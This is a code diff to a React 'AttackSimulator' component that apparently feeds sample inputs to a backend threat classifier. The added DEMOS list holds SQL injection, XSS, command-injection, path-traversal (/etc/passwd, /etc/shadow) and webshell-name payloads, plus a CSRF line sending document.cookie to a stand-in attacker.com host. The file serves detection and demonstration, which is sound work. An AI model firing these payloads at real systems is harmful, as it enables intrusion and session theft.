@@ -1,6 +1,45 @@
 import { useState, useEffect } from "react";
 import { sendAttack } from "../services/api";
 
+const DEMOS = {
+  sqli: [
+    "' OR 1=1 --",
+    "' UNION SELECT null, username, password FROM users --",
+    "' OR 'a'='a",
+    "'; DROP TABLE users; --",
+    "admin' --",
+    "1' OR '1'='1"
+  ],
+  xss: [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<iframe src='javascript:alert(1)'></iframe>",
+    "<details open ontoggle=alert(1)>"
+  ],
+  bruteforce: ["admin123", "password", "123456", "root", "guest"],
+  command_injection: [
+    "whoami; ping -c 4 127.0.0.1",
+    "ls -la /var/www",
+    "cat /etc/passwd",
+    "uname -a",
+    "id; whoami"
+  ],
+  path_traversal: [
+    "../../../../etc/passwd",
+    "../../../windows/system32/cmd.exe",
+    "../../../../var/log/apache2/access.log",
+    "../../../../etc/shadow"
+  ],
+  file_upload_attack: ["shell.php", "backdoor.php", "exploit.py", "image.php.jpg"],
+  ddos_pattern: ["AAAAAA repeated spam", "rapid requests", "flood traffic", "connection spike"],
+  csrf: ["<form action='/transfer'>", "<img src='http://attacker.com/steal?c='+document.cookie>", "<iframe src='http://victim.com/delete_account'>"],
+  jwt_attack: ["eyJhbGciOiJIUzI1Ni...", "eyJhbGciOiJub25l..."],
+  api_abuse: ["/api/login spam", "/api/users", "/api/admin", "/api/v1/debug"],
+  normal: ["login attempt", "GET /profile", "POST /feedback"],
+  suspicious: ["Click here to reset your compromised password", "Suspicious link.exe", "Unexpected redirect"]
+};
+
 export default function AttackSimulator() {
   const [input, setInput] = useState("");
   const [response, setResponse] = useState(null);
@@ -16,6 +55,11 @@ export default function AttackSimulator() {
     }
     setSessionId(id);
   }, []);
+
+  const getRandomDemo = (type) => {
+    const list = DEMOS[type] || ["test"];
+    return list[Math.floor(Math.random() * list.length)];
+  };
 
   const handleAttack = async () => {
     if (!input.trim()) return;
@@ -37,18 +81,6 @@ export default function AttackSimulator() {
     }
   };
 
-  const parseAiOutput = (text) => {
-    if (!text) return { risk: null, responseText: "No response", explanation: "" };
-    const riskMatch = text.match(/Risk:\s*([A-Za-z]+)/i);
-    const responseMatch = text.match(/Response:([\s\S]*?)(?=Explanation:|$)/i);
-    const explanationMatch = text.match(/Explanation:([\s\S]*)/i);
-    return {
-      risk: riskMatch ? riskMatch[1].toUpperCase() : null,
-      responseText: responseMatch ? responseMatch[1].trim() : text,
-      explanation: explanationMatch ? explanationMatch[1].trim() : ""
-    };
-  };
-
   const getRiskDetails = (prediction) => {
     switch (prediction) {
       case "sqli": return { level: "CRITICAL", color: "var(--danger)" };
@@ -65,6 +97,19 @@ export default function AttackSimulator() {
       case "normal": return { level: "NONE", color: "var(--text-dim)" };
       default: return { level: "UNKNOWN", color: "var(--primary)" };
     }
+  };
+
+  const parseAiOutput = (text) => {
+    if (!text) return { risk: null, responseText: "No response", explanation: "" };
+    const riskMatch = text.match(/Risk:\s*([A-Za-z]+)/i);
+    const responseMatch = text.match(/Response:([\s\S]*?)(?=Explanation:|$)/i);
+    const explanationMatch = text.match(/Explanation:([\s\S]*)/i);
+
+    return {
+      risk: riskMatch ? riskMatch[1].toUpperCase() : null,
+      responseText: responseMatch ? responseMatch[1].trim() : text,
+      explanation: explanationMatch ? explanationMatch[1].trim() : ""
+    };
   };
 
   return (
@@ -117,7 +162,7 @@ export default function AttackSimulator() {
         <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '1rem', flexWrap: 'wrap', gap: '1rem' }}>
           <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
             <button 
-              onClick={() => setInput("1' OR '1'='1")}
+              onClick={() => setInput(getRandomDemo("sqli"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
@@ -125,7 +170,7 @@ export default function AttackSimulator() {
               Demo SQLi
             </button>
             <button 
-              onClick={() => setInput("<script>alert('XSS')</script>")}
+              onClick={() => setInput(getRandomDemo("xss"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
@@ -133,7 +178,7 @@ export default function AttackSimulator() {
               Demo XSS
             </button>
             <button 
-              onClick={() => setInput("admin123")}
+              onClick={() => setInput(getRandomDemo("bruteforce"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
@@ -141,71 +186,71 @@ export default function AttackSimulator() {
               Demo Brute
             </button>
             <button 
-              onClick={() => setInput("whoami; ping -c 4 127.0.0.1")}
+              onClick={() => setInput(getRandomDemo("command_injection"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo CMD
             </button>
-            <button
-              onClick={() => setInput("../../../../windows/system32/cmd.exe")}
+            <button 
+              onClick={() => setInput(getRandomDemo("path_traversal"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo Path
             </button>
-            <button
-              onClick={() => setInput("shell.php")}
+            <button 
+              onClick={() => setInput(getRandomDemo("file_upload_attack"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo Upload
             </button>
-            <button
-              onClick={() => setInput("AAAAAA repeated spam")}
+            <button 
+              onClick={() => setInput(getRandomDemo("ddos_pattern"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo DDoS
             </button>
-            <button
-              onClick={() => setInput("<form action='/transfer'>")}
+            <button 
+              onClick={() => setInput(getRandomDemo("csrf"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo CSRF
             </button>
-            <button
-              onClick={() => setInput("eyJhbGciOiJIUzI1Ni...")}
+            <button 
+              onClick={() => setInput(getRandomDemo("jwt_attack"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo JWT
             </button>
-            <button
-              onClick={() => setInput("/api/login spam")}
+            <button 
+              onClick={() => setInput(getRandomDemo("api_abuse"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo API
             </button>
-            <button
-              onClick={() => setInput("login attempt")}
+            <button 
+              onClick={() => setInput(getRandomDemo("normal"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
             >
               Demo Normal
             </button>
-            <button
-              onClick={() => setInput("Click here to reset your compromised password")}
+            <button 
+              onClick={() => setInput(getRandomDemo("suspicious"))}
               style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
               onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
               onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
